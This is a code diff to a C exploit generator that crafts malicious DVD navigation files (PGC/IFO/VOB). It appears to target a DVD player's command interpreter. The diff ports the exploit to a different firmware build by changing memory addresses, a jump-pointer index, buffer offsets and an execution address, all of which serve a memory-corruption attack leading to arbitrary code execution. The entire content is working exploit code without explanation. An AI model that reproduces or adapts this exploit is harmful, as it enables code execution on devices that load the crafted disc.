@@ -24,8 +24,8 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     pgc->pgc_gi.set_pgc_pb_tm_hours(0);
     pgc->pgc_gi.set_pgc_pb_tm_minutes(0);
     pgc->pgc_gi.set_pgc_pb_tm_seconds(1);
-    pgc->pgc_gi.set_pgc_pb_tm_frames(5);
-    pgc->pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_25);
+    pgc->pgc_gi.set_pgc_pb_tm_frames(15);
+    pgc->pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_30);
     pgc->pgc_gi.pgc_ast_ctlt[0].stream_num_pf = 1 << 7;
     pgc->pgc_gi.pgc_pgmap_sa = 0xec;
     pgc->pgc_gi.c_pbit_sa = 0xee;
@@ -38,10 +38,10 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     pgc->c_pbit.pbi[0].set_c_pbtm_hours(0);
     pgc->c_pbit.pbi[0].set_c_pbtm_minutes(0);
     pgc->c_pbit.pbi[0].set_c_pbtm_seconds(1);
-    pgc->c_pbit.pbi[0].set_c_pbtm_frames(5);
-    pgc->c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_25);
-    pgc->c_pbit.pbi[0].c_lvobu_sa = 23;
-    pgc->c_pbit.pbi[0].c_lvobu_ea = 39;
+    pgc->c_pbit.pbi[0].set_c_pbtm_frames(15);
+    pgc->c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_30);
+    pgc->c_pbit.pbi[0].c_lvobu_sa = 24;
+    pgc->c_pbit.pbi[0].c_lvobu_ea = 43;
 
     pgc->c_posit.c_posi[0].c_vob_idn = 1;
     pgc->c_posit.c_posi[0].c_idn = 1;
@@ -95,20 +95,19 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 
 #define VOB_PATCH_LOC 0x629
 #define IFO_PGC_PATCH_LOC 0xcc
-#define IFO_CODE_PATCH_LOC 0x25c
 
-#define VM_CMD_PARSER_SWITCH_ADDR 0x00909208
-#define VM_ADDR 0x01558e40
-#define CTRL_DATA_ADDR (0x155cec0 + 0x0c + 0x629)
-#define JUMP_POINTER 0x0090ec20
+#define VM_CMD_PARSER_SWITCH_ADDR 0x00909108
+#define VM_ADDR 0x01383840
+#define CTRL_DATA_ADDR (0x13878c0 + 0x0c + 0x629)
+#define JUMP_POINTER 0x90eb18
 #define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
-#define CMD_DATA_ADDR 0x01551da8
+#define CMD_DATA_ADDR 0x137c7a8
 #define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
-#define INITIAL_COPY_BUF (0x1555608 + 0x10)
+#define INITIAL_COPY_BUF (0x1380008 + 0x10)
 #define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
 #define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
 #define EXEC_ADDR (CTRL_DATA_ADDR + 27)
-#define NEW_PGC_SECT "\x00\x00\x00\x2e"
+#define NEW_PGC_SECT "\x00\x00\x00\x32"
 
 int main() {
     printf("CMDT_SA: %x\n", CMDT_SA);
@@ -122,7 +121,7 @@ int main() {
         0x00, // VM_current_cmd_type_index
         0x00, // VM_current_cmd_index
         0x00, 0x00, // padding
-        0xa8, 0x1d, 0x55, 0x01, // VM_current_cmd_data
+        0xa8, 0xc7, 0x37, 0x01, // VM_current_cmd_data
         0x01, // DAT_01558e48
         0x00, // padding
         VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff, // FP_INDEX_lo
